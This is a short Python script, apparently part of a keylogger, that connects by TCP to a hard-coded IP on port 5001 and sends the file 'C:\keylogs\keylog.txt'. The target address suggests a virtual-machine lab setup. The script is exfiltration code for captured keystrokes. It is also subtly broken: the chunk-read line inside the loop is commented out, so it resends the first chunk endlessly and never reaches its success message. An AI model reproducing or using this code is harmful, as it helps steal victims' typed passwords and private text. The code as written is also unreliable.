import socket

def start_send(filepath, receiver_ip):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    client.connect((receiver_ip, 5001))
    
    with open(filepath, 'rb') as f:
        data = f.read(1024)
        while data:
            client.send(data)
            # data = f.read(1024)
            
    client.close()
    print("File sent successfully!")

if __name__ == '__main__':
    start_send(r"C:\keylogs\keylog.txt", '192.168.56.1')